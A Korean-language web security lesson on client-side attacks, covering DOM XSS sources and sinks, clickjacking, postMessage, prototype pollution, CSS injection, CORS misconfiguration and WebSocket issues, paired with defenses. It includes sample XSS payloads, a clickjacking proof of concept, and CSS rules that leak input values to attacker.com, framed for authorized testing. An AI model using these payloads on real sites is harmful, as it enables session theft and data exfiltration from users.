# 클라이언트측 공격

**이전**: [07. 서버측 공격](./07_Server_Side_Attacks.md) | **다음**: [09. 바이너리 기초](./09_Binary_Fundamentals.md)

---

클라이언트측 공격(Client-Side Attack)은 사용자의 브라우저 및 클라이언트측 코드의 취약점을 익스플로잇한다. 이러한 공격은 사용자와 웹 애플리케이션 간의 신뢰 관계를 대상으로 하며, 세션 도용, 데이터 유출 및 피해자를 대신한 무단 작업 수행으로 이어질 수 있어 특히 위험하다.

> **중요**: 이 레슨에 설명된 모든 기법은 자신이 소유하거나 명시적인 서면 허가를 받은 시스템에서만 사용해야 한다.

**난이도**: ⭐⭐⭐

## 학습 목표

1. DOM 기반 XSS 취약점을 식별하고 익스플로잇한다
2. 클릭재킹(clickjacking) 개념 증명 공격을 생성한다
3. 프레임 간 postMessage 통신을 익스플로잇한다
4. JavaScript 프로토타입 오염(prototype pollution)을 이해하고 익스플로잇한다
5. 데이터 도용을 위한 CORS 설정 오류를 식별한다
6. 인젝션 공격을 위해 WebSocket 연결을 익스플로잇한다
7. 브라우저 보안 모델(SOP, CSP, CORS)을 이해한다
8. 포괄적인 클라이언트측 보안 방어를 구현한다

---

## 목차

1. [DOM 기반 XSS 심층 분석](#1-dom-기반-xss-심층-분석)
2. [클릭재킹 공격](#2-클릭재킹-공격)
3. [브라우저 익스플로잇 기초](#3-브라우저-익스플로잇-기초)
4. [postMessage 취약점](#4-postmessage-취약점)
5. [프로토타입 오염](#5-프로토타입-오염)
6. [CSS 인젝션 기법](#6-css-인젝션-기법)
7. [CORS 설정 오류 익스플로잇](#7-cors-설정-오류-익스플로잇)
8. [WebSocket 보안](#8-websocket-보안)
9. [서비스 워커 공격](#9-서비스-워커-공격)
10. [클라이언트측 방어 전략](#10-클라이언트측-방어-전략)
11. [연습문제](#11-연습문제)
12. [요약](#12-요약)
13. [참고 자료](#13-참고-자료)

---

## 1. DOM 기반 XSS 심층 분석

DOM 기반 XSS(DOM-based XSS)는 JavaScript가 공격자가 제어할 수 있는 소스(source)에서 데이터를 읽어 위험한 싱크(sink)에 전달할 때 브라우저에서 전적으로 발생한다.

### 1.1 소스와 싱크

**소스(Sources)** (공격자가 제어 가능):
- `location.hash`, `location.search`, `location.href`
- `document.URL`, `document.referrer`
- `window.name`, `postMessage` 데이터
- 웹 스토리지(`localStorage`, `sessionStorage`)

**싱크(Sinks)** (위험한 함수):
- `innerHTML`, `outerHTML`, `document.write()`
- `eval()`, `setTimeout()`, `setInterval()`
- `Function()` 생성자
- `element.src`, `element.href`
- `jQuery.html()`, `jQuery.append()`

```python
"""
DOM XSS source-sink analysis framework.

Helps identify potential DOM XSS vulnerabilities
by mapping data flow from sources to sinks.
"""

from dataclasses import dataclass, field


@dataclass
class DOMFlow:
    """A data flow from source to sink in client-side JavaScript."""
    source: str
    sink: str
    severity: str
    exploitable: bool
    example_payload: str = ""
    defense: str = ""


DOM_XSS_FLOWS = [
    DOMFlow("location.hash", "innerHTML",
            "High", True,
            "#<img src=x onerror=alert(1)>",
            "Use textContent instead of innerHTML"),
    DOMFlow("location.search", "document.write()",
            "High", True,
            "?q=<script>alert(1)</script>",
            "Use DOM APIs instead of document.write"),
    DOMFlow("location.hash", "eval()",
            "Critical", True,
            "#');alert(1);//",
            "Never use eval() with user input"),
    DOMFlow("document.referrer", "innerHTML",
            "Medium", True,
            "Craft referrer with XSS payload",
            "Sanitize before DOM insertion"),
    DOMFlow("postMessage", "innerHTML",
            "High", True,
            "Send message with HTML payload",
            "Validate origin and sanitize data"),
    DOMFlow("localStorage", "innerHTML",
            "Medium", True,
            "Poison localStorage via XSS, triggers on next visit",
            "Sanitize stored data before rendering"),
]


def analyze_dom_flows() -> str:
    """Generate a DOM XSS analysis report."""
    lines = ["DOM XSS Source-Sink Analysis", "=" * 50]
    for flow in DOM_XSS_FLOWS:
        lines.append(f"\n  {flow.source} → {flow.sink}")
        lines.append(f"  Severity: {flow.severity} | Exploitable: {flow.exploitable}")
        lines.append(f"  Payload: {flow.example_payload}")
        lines.append(f"  Defense: {flow.defense}")
    return "\n".join(lines)


if __name__ == "__main__":
    print(analyze_dom_flows())
```

---

## 2. 클릭재킹 공격

클릭재킹(Clickjacking)은 투명한 iframe을 오버레이하여 사용자가 숨겨진 요소를 클릭하도록 속인다.

### 2.1 기본 클릭재킹 PoC

```html
<!-- Clickjacking proof-of-concept -->
<html>
<head><title>Click to Win!</title></head>
<body>
<h1>Click the button to claim your prize!</h1>
<div style="position: relative;">
    <!-- Visible decoy button -->
    <button style="font-size: 24px; padding: 20px;">Claim Prize</button>

    <!-- Hidden target iframe positioned over the button -->
    <iframe src="https://target.com/account/delete"
            style="position: absolute; top: 0; left: 0;
                   width: 500px; height: 200px;
                   opacity: 0.0001; z-index: 999;">
    </iframe>
</div>
</body>
</html>
```

### 2.2 방어: X-Frame-Options 및 CSP

```
# Prevent framing entirely
X-Frame-Options: DENY

# Allow framing only from same origin
X-Frame-Options: SAMEORIGIN

# CSP frame-ancestors directive (modern replacement)
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
```

---

## 3. 브라우저 익스플로잇 기초

현대 브라우저는 여러 보안 계층을 구현한다:

- **동일 출처 정책(Same-Origin Policy, SOP)**: 크로스 오리진 DOM 접근을 제한한다
- **콘텐츠 보안 정책(Content Security Policy, CSP)**: 리소스 로딩을 제어한다
- **CORS**: 크로스 오리진 HTTP 요청을 관리한다
- **샌드박싱(Sandboxing)**: 렌더러 프로세스를 격리한다
- **사이트 격리(Site Isolation)**: 사이트를 서로 다른 프로세스로 분리한다

---

## 4. postMessage 취약점

`window.postMessage()`는 윈도우 간 크로스 오리진 통신을 가능하게 한다. 오용하면 XSS 및 데이터 도용으로 이어진다.

```javascript
// VULNERABLE — no origin check
window.addEventListener("message", function(event) {
    document.getElementById("output").innerHTML = event.data; // XSS!
});

// SAFE — validate origin and sanitize
window.addEventListener("message", function(event) {
    if (event.origin !== "https://trusted.com") return;
    document.getElementById("output").textContent = event.data; // Safe
});
```

---

## 5. 프로토타입 오염

프로토타입 오염(Prototype Pollution)은 JavaScript의 프로토타입 체인을 조작하여 모든 객체에 속성을 주입한다.

```javascript
// Pollution via __proto__
const obj = {};
obj.__proto__.isAdmin = true;

// Now ALL objects have isAdmin = true
const user = {};
console.log(user.isAdmin); // true!

// Common in libraries that deep-merge objects
// merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))
```

---

## 6. CSS 인젝션 기법

CSS 인젝션(CSS Injection)은 JavaScript 없이 데이터를 유출할 수 있다:

```css
/* Attribute value exfiltration */
input[value^="a"] { background: url(https://attacker.com/?char=a); }
input[value^="b"] { background: url(https://attacker.com/?char=b); }
/* ... repeat for all characters */
```

---

## 7. CORS 설정 오류 익스플로잇

```python
"""
CORS misconfiguration checker for authorized testing.
"""

from dataclasses import dataclass
from typing import Optional


@dataclass
class CORSTest:
    """CORS configuration test result."""
    url: str
    origin_tested: str
    access_control_allow_origin: str
    access_control_allow_credentials: bool
    vulnerable: bool
    description: str


CORS_TESTS = [
    ("Reflect any origin", "https://evil.com"),
    ("Null origin", "null"),
    ("Subdomain wildcard", "https://evil.target.com"),
    ("Pre-domain match", "https://target.com.evil.com"),
    ("Post-domain match", "https://eviltarget.com"),
]


def check_cors_config(
    allow_origin: str,
    allow_credentials: bool,
    tested_origin: str,
) -> tuple[bool, str]:
    """Check if CORS configuration is vulnerable."""
    if allow_origin == "*" and allow_credentials:
        return True, "Wildcard with credentials — browsers block this but config is wrong"
    if allow_origin == tested_origin and allow_credentials:
        if "evil" in tested_origin or tested_origin == "null":
            return True, f"Reflects attacker origin '{tested_origin}' with credentials"
    return False, "Configuration appears safe for this test"


if __name__ == "__main__":
    print("CORS Misconfiguration Checker")
    print("=" * 50)
    for desc, origin in CORS_TESTS:
        print(f"\n  Test: {desc}")
        print(f"  Origin: {origin}")
```

---

## 8. WebSocket 보안

WebSocket 연결은 일부 브라우저 보안 기능을 우회하며 인젝션 및 하이재킹에 취약할 수 있다.

### 8.1 WebSocket 문제점

- 초기 핸드셰이크에 동일 출처 정책이 적용되지 않음
- WebSocket 연결에 대한 CSRF 유사 공격
- 입력이 유효성 검사되지 않으면 메시지 인젝션
- 크로스사이트 WebSocket 하이재킹(CSWSH)

---

## 9. 서비스 워커 공격

악성 서비스 워커(Service Worker)는 웹 애플리케이션의 모든 요청을 가로채서 지속적인 중간자(MITM) 공격을 가능하게 한다.

---

## 10. 클라이언트측 방어 전략

| 공격 | 방어 |
|------|------|
| DOM XSS | textContent 사용, DOMPurify로 새니타이즈 |
| 클릭재킹 | X-Frame-Options: DENY, CSP frame-ancestors |
| postMessage | 출처 검증, 데이터 새니타이즈 |
| 프로토타입 오염 | Object.freeze, null 프로토타입 객체 |
| CORS | 엄격한 허용 목록, 임의 출처 반영 금지 |
| CSP | nonce가 있는 엄격한 CSP, unsafe-inline 금지 |
| WebSocket | Origin 헤더 검증, 연결 인증 |

---

## 11. 연습문제

1. **DOM XSS**: 소스-싱크 분석을 사용하여 연습 애플리케이션에서 DOM 기반 XSS를 찾아 익스플로잇한다.
2. **클릭재킹 PoC**: 프레임 보호가 없는 사이트에 대한 클릭재킹 공격을 생성한다.
3. **CORS 테스트**: 위의 테스트 매트릭스를 사용하여 웹 애플리케이션의 CORS 구성을 테스트한다.
4. **postMessage**: 취약한 postMessage 핸들러를 익스플로잇하여 XSS를 달성한다.
5. **CSP 우회**: CSP 정책이 주어졌을 때, 제한에도 불구하고 JavaScript를 실행하는 방법을 찾는다.
6. **방어**: Flask 애플리케이션에 포괄적인 클라이언트측 보안 헤더를 구현한다.

---

## 12. 요약

클라이언트측 공격은 브라우저를 공격 벡터로 익스플로잇한다:

- **DOM XSS**는 공격자가 제어하는 소스에서 위험한 싱크로의 데이터 흐름이다
- **클릭재킹**은 보이지 않는 프레임을 오버레이하여 사용자 클릭을 속인다
- **postMessage**는 출처가 검증되지 않으면 크로스 오리진 데이터 도용을 가능하게 한다
- **프로토타입 오염**은 JavaScript의 프로토타입 체인을 오염시킨다
- **CORS 설정 오류**는 크로스 오리진 데이터 도용을 허용한다
- 방어에는 콘텐츠 보안 정책, 적절한 헤더 및 입력 새니타이제이션이 필요하다

---

## 13. 참고 자료

- PortSwigger DOM XSS: https://portswigger.net/web-security/cross-site-scripting/dom-based
- PortSwigger Clickjacking: https://portswigger.net/web-security/clickjacking
- DOMPurify: https://github.com/cure53/DOMPurify
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
